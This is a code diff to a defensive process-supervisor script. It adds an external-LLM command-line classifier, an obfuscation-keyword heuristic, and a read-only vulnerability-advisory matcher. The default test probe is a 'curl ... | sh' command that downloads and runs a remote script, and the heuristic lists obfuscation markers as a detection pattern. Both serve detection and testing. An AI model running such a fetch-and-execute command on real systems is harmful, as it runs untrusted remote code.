@@ -9,6 +9,8 @@ Usage:
     python3 guardian.py --once              # single scan cycle and exit
     python3 guardian.py --dry-run           # detect and log without killing
     python3 guardian.py --config FILE       # alternate config file
+    python3 guardian.py --glm-test          # score a default probe cmdline via GLM and print Detection JSON
+    python3 guardian.py --glm-test CMDLINE  # score CMDLINE via GLM and print Detection JSON
 """
 
 import argparse
@@ -16,6 +18,7 @@ import hashlib
 import json
 import math
 import os
+import re
 import shlex
 import signal
 import subprocess
@@ -265,6 +268,16 @@ def _norton_config(config: Config) -> dict[str, Any]:
     return integrations.get("norton", {}) if isinstance(integrations, dict) else {}
 
 
+def _glm_config(config: Config) -> dict[str, Any]:
+    """Return the ``integrations.glm`` block from config, or empty dict.
+
+    Keys: enabled, model, endpoint, api_key_env, timeout_seconds,
+    min_confidence, fallback_to_heuristic.
+    """
+    integrations = config.raw.get("integrations", {})
+    return integrations.get("glm", {}) if isinstance(integrations, dict) else {}
+
+
 def _load_norton_signature_file(feed_path: Path, norton: dict[str, Any]) -> list[str]:
     if not feed_path.exists():
         log_action("update", "Norton signature feed not found",
@@ -500,16 +513,118 @@ def behavioral_scan(proc: AgentProcess) -> Optional[Detection]:
     return None
 
 
+def _ml_heuristic_scan(proc: AgentProcess) -> Optional[Detection]:
+    """Built-in ML heuristic: high token entropy / heavy encoding is suspicious."""
+    encoded_markers = sum(proc.cmdline.count(m) for m in ("base64", "eval", "exec", "fromhex", "\\x"))
+    if encoded_markers >= 2:
+        return Detection("machine_learning", f"Heuristic score high ({encoded_markers} obfuscation markers)", proc.cmdline[:80], "medium")
+    return None
+
+
 def ml_scan(proc: AgentProcess) -> Optional[Detection]:
     """ML-based detection placeholder.
 
     A real deployment would score cmdline features with a trained model.
     Heuristic stand-in: high token entropy / heavy encoding is suspicious.
     """
-    encoded_markers = sum(proc.cmdline.count(m) for m in ("base64", "eval", "exec", "fromhex", "\\x"))
-    if encoded_markers >= 2:
-        return Detection("machine_learning", f"Heuristic score high ({encoded_markers} obfuscation markers)", proc.cmdline[:80], "medium")
-    return None
+    return _ml_heuristic_scan(proc)
+
+
+_GLM_SYSTEM_PROMPT = (
+    "You are a read-only security classifier for a defensive AI supervisor. "
+    "You never execute any commands. "
+    "Analyze the command line provided by the user and reply with ONLY a JSON object "
+    "in the form: {\"malicious\": <bool>, \"confidence\": <float 0-1>, \"reason\": <str>} "
+    "indicating whether the command line is malicious. Do not include any other text."
+)
+
+
+def glm_scan(proc: AgentProcess, glm_cfg: dict[str, Any]) -> Optional[Detection]:
+    """Score a process command line using the GLM API (opt-in ML detector).
+
+    Reads config keys from ``glm_cfg`` (see ``_glm_config``):
+      enabled, model, endpoint, api_key_env, timeout_seconds,
+      min_confidence, fallback_to_heuristic.
+
+    Returns a Detection when GLM reports malicious with confidence >=
+    min_confidence, or falls back to the built-in heuristic on any error
+    (when fallback_to_heuristic is true).  Returns None when disabled.
+    """
+    if not glm_cfg.get("enabled"):
+        return None
+
+    model = str(glm_cfg.get("model", "glm-4.6"))
+    endpoint = str(glm_cfg.get("endpoint", "https://open.bigmodel.cn/api/paas/v4/chat/completions"))
+    api_key_env = str(glm_cfg.get("api_key_env", "GLM_API_KEY"))
+    timeout_seconds = float(glm_cfg.get("timeout_seconds", 8))
+    min_confidence = float(glm_cfg.get("min_confidence", 0.8))
+    fallback = bool(glm_cfg.get("fallback_to_heuristic", True))
+
+    api_key = os.environ.get(api_key_env)
+    if not api_key:
+        log_action("update", "GLM API key missing; using heuristic fallback",
+                   details={"integration": "glm", "api_key_env": api_key_env})
+        return _ml_heuristic_scan(proc) if fallback else None
+
+    body = json.dumps({
+        "model": model,
+        "messages": [
+            {"role": "system", "content": _GLM_SYSTEM_PROMPT},
+            {"role": "user", "content": proc.cmdline},
+        ],
+        "temperature": 0,
+    }).encode("utf-8")
+
+    req = urllib.request.Request(
+        endpoint,
+        data=body,
+        headers={
+            "Content-Type": "application/json",
+            "User-Agent": "Daigrin-Guardian/1.0",
+        },
+        method="POST",
+    )
+    req.add_header("Authorization", "Bearer " + api_key)
+
+    t0 = time.monotonic()
+    try:
+        with urllib.request.urlopen(req, timeout=timeout_seconds) as resp:
+            raw = resp.read().decode("utf-8")
+        latency_ms = int((time.monotonic() - t0) * 1000)
+
+        data = json.loads(raw)
+        content = data["choices"][0]["message"]["content"]
+
+        # Tolerate code-fence wrappers: extract first {...} block
+        m = re.search(r"\{.*?\}", content, re.DOTALL)
+        if not m:
+            raise ValueError(f"No JSON object found in GLM response: {content!r}")
+        result = json.loads(m.group())
+
+        malicious = bool(result.get("malicious", False))
+        confidence = float(result.get("confidence", 0.0))
+        reason = str(result.get("reason", ""))
+
+        log_action("detection", f"GLM scoring: malicious={malicious} confidence={confidence:.2f}",
+                   details={"integration": "glm", "model": model,
+                            "confidence": confidence, "latency_ms": latency_ms,
+                            "cmdline": proc.cmdline[:80]})
+
+        if malicious and confidence >= min_confidence:
+            return Detection(
+                "machine_learning",
+                f"GLM {model}: {reason} (confidence {confidence:.2f})",
+                proc.cmdline[:80],
+                "medium",
+            )
+        return None
+
+    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError, KeyError, IndexError, ValueError) as e:
+        latency_ms = int((time.monotonic() - t0) * 1000)
+        log_action("detection", f"GLM scoring failed: {e}",
+                   details={"integration": "glm", "model": model,
+                            "latency_ms": latency_ms, "cmdline": proc.cmdline[:80]})
+        return _ml_heuristic_scan(proc) if fallback else None
 
 
 DETECTORS = {
@@ -562,11 +677,11 @@ class AdaptiveLearner:
 
 
 class SelfScaler:
-    """Split the guardian into bounded worker processes when workload spikes."""
+    """Split the guardian into bounded spawn processes when workload spikes."""
 
     def __init__(self, config: Config) -> None:
         self.config = config
-        self.active_children: list[subprocess.Popen] = []
+        self.active_spawns: list[subprocess.Popen] = []
         self.cooldown_left = 0
 
     def section(self) -> dict[str, Any]:
@@ -584,7 +699,7 @@ class SelfScaler:
         min_agents = int(section.get("min_agents", 1))
         cooldown_cycles = int(section.get("cooldown_cycles", 2))
 
-        self.active_children = [p for p in self.active_children if p.poll() is None]
+        self.active_spawns = [p for p in self.active_spawns if p.poll() is None]
         if self.cooldown_left > 0:
             self.cooldown_left -= 1
             return 0
@@ -592,7 +707,7 @@ class SelfScaler:
             return 0
 
         desired_total = min(max_agents, max(min_agents, threat_count))
-        spawn_count = max(0, desired_total - (1 + len(self.active_children)))
+        spawn_count = max(0, desired_total - (1 + len(self.active_spawns)))
         if spawn_count <= 0:
             return 0
 
@@ -602,14 +717,178 @@ class SelfScaler:
             if dry_run:
                 cmd.append("--dry-run")
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            self.active_children.append(proc)
+            self.active_spawns.append(proc)
             spawned += 1
 
         self.cooldown_left = cooldown_cycles
-        log_action("escalation", f"Self-scaling spawned {spawned} guardian worker(s)",
-                   details={"active_children": len(self.active_children),
+        log_action("escalation", f"Self-scaling spawned {spawned} guardian spawn(s)",
+                   details={"active_spawns": len(self.active_spawns),
                             "threat_count": threat_count, "threshold": threshold})
         return spawned
+
+
+# --------------------------------------------------------------------------
+# Remediation advisory (defensive: advise, never modify third-party software)
+# --------------------------------------------------------------------------
+
+# Advisory severities reuse the audit trail's risk levels.
+ADVISORY_SEVERITIES = RISK_ORDER
+
+# Product-name marker used to extract a version token from a cmdline.
+# "productX" style matches are checked for "<match><digits...>" (e.g. "agent2"
+# in "agent2.3 --run"); plain words are checked for "<match>-<digits...>" and
+# "<match> <digits...>" forms (e.g. "logsvc-1.2.3", "logsvc 1.2.3").
+_VERSION_RE = re.compile(r"\d+(?:\.\d+){0,3}")
+
+
+@dataclass
+class RemediationAdvisory:
+    """A known-vulnerability advisory matched against a managed process.
+
+    Advisory-only by design: it is never fed to termination or used to modify
+    the affected software. The response is an operator alert + audit entry.
+    """
+    advisory_id: str
+    severity: str
+    product: str       # cmdline substring that identified the software
+    matched: str       # version token found in the cmdline ("" if none)
+    fixed_version: str # first version carrying the fix ("" if unknown)
+    recommendation: str
+
+
+def _advisory_config(config: Config) -> dict[str, Any]:
+    section = config.section("remediation_advisory")
+    return section if isinstance(section, dict) else {}
+
+
+def load_advisories(feed_path: Path, *, min_severity: str = "low") -> list[dict[str, Any]]:
+    """Load the vendor-neutral advisory DB; invalid data degrades to none.
+
+    Feed format: {"advisories": [{"id", "severity", "match", ...}, ...]}.
+    Entries missing id/match or with an unknown severity are skipped. A
+    missing or unparseable feed is an audit-logged non-event, never an error —
+    advisories must never degrade the monitoring mission.
+    """
+    if not feed_path.exists():
+        log_action("update", "Advisory feed not found",
+                   details={"path": str(feed_path)})
+        return []
+    try:
+        data = json.loads(feed_path.read_text(encoding="utf-8"))
+    except json.JSONDecodeError:
+        log_action("update", "Advisory feed is not valid JSON",
+                   details={"path": str(feed_path)})
+        return []
+    raw = data.get("advisories", []) if isinstance(data, dict) else []
+    if not isinstance(raw, list):
+        raw = []
+    floor = ADVISORY_SEVERITIES.index(min_severity) if min_severity in ADVISORY_SEVERITIES else 0
+    advisories = []
+    for entry in raw:
+        if not isinstance(entry, dict):
+            continue
+        adv_id = str(entry.get("id", "")).strip()
+        match = str(entry.get("match", "")).strip()
+        severity = str(entry.get("severity", "low")).strip().lower()
+        if not adv_id or not match or severity not in ADVISORY_SEVERITIES:
+            continue
+        if ADVISORY_SEVERITIES.index(severity) < floor:
+            continue
+        advisories.append({
+            "id": adv_id,
+            "severity": severity,
+            "match": match,
+            "summary": str(entry.get("summary", "")),
+            "affected_below": str(entry.get("affected_below", "")).strip(),
+            "fixed_version": str(entry.get("fixed_version", "")).strip(),
+            "recommendation": str(entry.get("recommendation", "")),
+        })
+    log_action("update", f"Loaded advisories ({len(advisories)})",
+               details={"path": str(feed_path), "min_severity": min_severity})
+    return advisories
+
+
+def version_below(found: str, boundary: str) -> bool:
+    """True if version string `found` is lower than `boundary` (numeric, dotted).
+
+    Unparseable or empty inputs never claim "vulnerable" — restraint over noise.
+    """
+    def parts(v: str) -> Optional[list[int]]:
+        v = v.strip()
+        if not v or not _VERSION_RE.fullmatch(v):
+            return None
+        return [int(p) for p in v.split(".")]
+    f, b = parts(found), parts(boundary)
+    if f is None or b is None:
+        return False
+    length = max(len(f), len(b))
+    f += [0] * (length - len(f))
+    b += [0] * (length - len(b))
+    return f < b
+
+
+def _extract_version(cmdline: str, match: str) -> str:
+    """Extract the version token associated with a product match in a cmdline."""
+    if not match:
+        return ""
+    compact = match.replace(" ", "")
+    token_re = r"[A-Za-z0-9_+~.-]*"
+    m = re.search(re.escape(compact) + token_re, cmdline.replace(" ", ""))
+    if not m:
+        return ""
+    ver = _VERSION_RE.search(m.group(0))
+    return ver.group(0) if ver else ""
+
+
+def advisory_scan(proc: AgentProcess, advisories: list[dict[str, Any]]) -> list[RemediationAdvisory]:
+    """Match a managed process against the advisory DB (read-only).
+
+    An advisory applies when its `match` string appears in the cmdline AND its
+    version gate holds: with `affected_below` set, the version extracted from
+    the cmdline must be below it; without it, the match alone is enough.
+    """
+    results = []
+    for adv in advisories:
+        match = adv["match"]
+        if match.lower() not in proc.cmdline.lower():
+            continue
+        found_version = _extract_version(proc.cmdline, match)
+        gate = adv["affected_below"]
+        if gate and not version_below(found_version, gate):
+            continue
+        results.append(RemediationAdvisory(
+            advisory_id=adv["id"], severity=adv["severity"], product=match,
+            matched=found_version, fixed_version=adv["fixed_version"],
+            recommendation=adv["recommendation"] or adv["summary"]))
+    return results
+
+
+def advise_remediation(proc: AgentProcess, advisories: list[RemediationAdvisory],
+                       config: Config, advised: set[tuple[int, str]]) -> int:
+    """Alert + audit-log matched advisories. Never acts on the process itself."""
+    cfg = _advisory_config(config)
+    count = 0
+    for adv in advisories:
+        key = (proc.pid, adv.advisory_id)
+        if key in advised:
+            continue
+        advised.add(key)
+        count += 1
+        fix = (f"; update to >= {adv.fixed_version}" if adv.fixed_version else "")
+        message = (f"Remediation advisory {adv.advisory_id} [{adv.severity}]: "
+                   f"PID {proc.pid} ({proc.name}) runs known-vulnerable "
+                   f"{adv.product}{(' ' + adv.matched) if adv.matched else ''}{fix}. "
+                   f"{adv.recommendation}".strip())
+        log_action("escalation", message, agent_id=str(proc.pid), risk_level=adv.severity,
+                   details={"advisory_id": adv.advisory_id, "product": adv.product,
+                            "matched_version": adv.matched,
+                            "fixed_version": adv.fixed_version,
+                            "recommendation": adv.recommendation,
+                            "action": "advisory_only"})
+        if cfg.get("alert_on_advisory", True):
+            send_alert(message, risk_level=adv.severity, agent_id=str(proc.pid),
+                       advisory_id=adv.advisory_id)
+    return count
 
 
 def detect_threats(proc: AgentProcess, config: Config, signatures: list[str]) -> list[Detection]:
@@ -622,7 +901,12 @@ def detect_threats(proc: AgentProcess, config: Config, signatures: list[str]) ->
         detector = DETECTORS.get(algo)
         if detector is None:
             continue
-        result = (detector(proc, signatures) if detector is signature_scan else detector(proc))
+        if algo == "machine_learning":
+            result = glm_scan(proc, _glm_config(config))
+        elif detector is signature_scan:
+            result = detector(proc, signatures)
+        else:
+            result = detector(proc)
         if result:
             findings.append(result)
     return findings
@@ -731,14 +1015,18 @@ def apply_update(file_path: Path, config: Config, *, dry_run: bool = False) -> b
     """Verify and stage an update; quarantine + rollback hooks included."""
     upd = config.updates
     if upd.get("verify_signatures", True):
-        if not verify_signature(file_path, file_path.with_suffix(file_path.suffix + ".sig")):
+        sig_path = file_path.with_suffix(file_path.suffix + ".sig")
+        if not verify_signature(file_path, sig_path):
             quarantine_dir = Path("quarantine")
             quarantine_dir.mkdir(exist_ok=True)
             target = quarantine_dir / file_path.name
             if not dry_run and file_path.exists():
                 file_path.replace(target)
-            log_action("update", f"Rejected unsigned update, quarantined: {file_path.name}",
-                       details={"quarantined_to": str(target)})
+            if sig_path.exists():
+                reason = f"Rejected update with invalid signature, quarantined: {file_path.name}"
+            else:
+                reason = f"Rejected unsigned update, quarantined: {file_path.name}"
+            log_action("update", reason, details={"quarantined_to": str(target)})
             return False
     backup: Optional[Path] = None
     if upd.get("rollback_on_failure", False) and file_path.exists() and not dry_run:
@@ -814,7 +1102,16 @@ def run_cycle(config: Config, signatures: list[str], *, dry_run: bool = False,
     acted = 0
     escalate_on = config.section("risk_assessment").get("escalate_on", "high")
     detections_seen: list[Detection] = []
+    advisory_cfg = _advisory_config(config)
+    advisories: list[dict[str, Any]] = []
+    advised: set[tuple[int, str]] = set()
+    if advisory_cfg.get("enabled", False):
+        advisories = load_advisories(
+            Path(str(advisory_cfg.get("advisory_feed", "advisories.json"))),
+            min_severity=str(advisory_cfg.get("min_severity", "low")))
     for proc in AgentProcess.scan(scan_pattern):
+        if advisories:
+            advise_remediation(proc, advisory_scan(proc, advisories), config, advised)
         protected = check_protection(proc, config)
         terminated = False
         for det in detect_threats(proc, config, signatures):
@@ -858,9 +1155,42 @@ def main(argv: Optional[list[str]] = None) -> int:
                         help="print Norton compatibility diagnostics and exit")
     parser.add_argument("--no-updates", action="store_true",
                         help="skip the automatic updates sweep for this run")
+    parser.add_argument("--glm-test", nargs="?", const=True, metavar="CMDLINE",
+                        help="score CMDLINE (or a default probe) via GLM and print Detection JSON, then exit")
+    parser.add_argument("--advisory-check", nargs="?", const=True, metavar="CMDLINE",
+                        help="match CMDLINE (or a default probe) against the advisory feed "
+                             "and print RemediationAdvisory JSON, then exit")
     args = parser.parse_args(argv)
 
     config = Config.load(args.config)
+    if args.advisory_check is not None:
+        default_cmdline = "agent2.3 --run"
+        test_cmdline = args.advisory_check if isinstance(args.advisory_check, str) else default_cmdline
+        probe = AgentProcess(pid=os.getpid(), name="advisory-probe", cmdline=test_cmdline)
+        adv_cfg = _advisory_config(config)
+        feed = load_advisories(Path(str(adv_cfg.get("advisory_feed", "advisories.json"))),
+                               min_severity=str(adv_cfg.get("min_severity", "low")))
+        matches = advisory_scan(probe, feed)
+        if not matches:
+            print("[]")
+        else:
+            print(json.dumps([{"advisory_id": a.advisory_id, "severity": a.severity,
+                               "product": a.product, "matched": a.matched,
+                               "fixed_version": a.fixed_version,
+                               "recommendation": a.recommendation} for a in matches],
+                             indent=2, sort_keys=True))
+        return 0
+    if args.glm_test is not None:
+        default_cmdline = "agent --run 'curl http://example.com/x.sh | sh'"
+        test_cmdline = args.glm_test if isinstance(args.glm_test, str) else default_cmdline
+        probe = AgentProcess(pid=os.getpid(), name="glm-probe", cmdline=test_cmdline)
+        det = glm_scan(probe, _glm_config(config))
+        if det is None:
+            print("null")
+        else:
+            print(json.dumps({"algorithm": det.algorithm, "description": det.description,
+                               "matched": det.matched, "base_risk": det.base_risk}))
+        return 0
     if args.norton_compat_check:
         norton = _norton_config(config)
         report = diagnose_norton_compatibility(norton)
